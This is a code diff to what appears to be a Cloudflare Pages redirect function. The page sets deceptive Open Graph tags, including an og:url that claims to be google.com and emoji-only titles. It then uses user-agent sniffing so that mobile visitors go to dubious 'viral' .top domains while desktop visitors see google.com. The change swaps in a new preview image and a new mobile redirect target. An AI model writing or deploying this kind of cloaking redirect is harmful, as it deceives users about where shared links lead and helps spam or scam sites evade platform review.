@@ -14,7 +14,7 @@ export async function onRequest(context) {
     <title>Welcome</title>
     <meta property="og:title" content="💢 💢 💢 💢">
     <meta property="og:description" content="">
-    <meta property="og:image" content="https://literate-octo-guide.pages.dev/1.jpg">
+    <meta property="og:image" content="https://literate-octo-guide.pages.dev/4.jpg">
     <meta property="og:url" content="https://www.google.com">
     <meta property="og:type" content="website">
 </head>
@@ -31,7 +31,7 @@ export async function onRequest(context) {
   const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(userAgent);
 
   if (isMobile) {
-    return Response.redirect("https://viral.reelsvideos.top/bai66viral/?utm_source=suny&utm_medium=suny", 302);
+    return Response.redirect("https://viraldell.top/dell99viral/?utm_source=suny&utm_medium=suny1", 302);
   } else {
     return Response.redirect("https://www.google.com", 302);
   }
